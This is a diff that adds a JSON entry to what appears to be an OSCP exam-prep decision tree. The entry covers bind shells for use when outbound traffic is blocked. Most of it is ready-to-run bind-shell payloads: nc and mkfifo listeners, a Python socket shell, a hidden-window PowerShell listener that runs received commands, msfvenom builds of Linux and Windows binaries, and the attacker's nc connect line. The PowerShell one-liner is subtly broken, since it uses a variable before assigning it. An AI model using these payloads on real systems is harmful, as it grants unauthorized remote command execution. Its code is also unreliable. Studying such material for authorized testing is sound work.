@@ -1,0 +1,18 @@
+{
+  "id": "shell_bind",
+  "phase": "SHELL",
+  "title": "Bind Shell — Outbound Blocked",
+  "body": "Reverse shell requires outbound from target. If egress is fully filtered, flip it — bind shell listens ON the target, you connect TO it. Requires inbound access to target port.",
+  "cmd": "# -- BIND SHELL PAYLOADS ------------------\n# nc on target (if -e available)\nnc -nlvp 4444 -e /bin/bash\n\n# nc without -e (use mkfifo)\nmkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -nlvp 4444 > /tmp/f\n\n# Python3 bind\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"0.0.0.0\",4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n\n# PowerShell bind (Windows)\npowershell -nop -w hidden -c \"$l=New-Object Net.Sockets.TcpListener('0.0.0.0',4444);$l.start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb2,0,$sb2.Length);$s.Flush()};$c.Close();$l.Stop()\"\n\n# msfvenom bind (Linux)\nmsfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf\n\n# msfvenom bind (Windows)\nmsfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind.exe\n\n# -- CONNECT FROM ATTACKER -----------------\nnc $ip 4444",
+  "warn": "Bind shells on OSCP exam machines are risky — another candidate could connect to your bind shell. Use a non-obvious port and close it when done. Reverse shells are always preferred.",
+  "choices": [
+    {
+      "label": "Bind shell connected — upgrade TTY",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "Port blocked inbound too — web shell only",
+      "next": "iis_aspx"
+    }
+  ]
+}
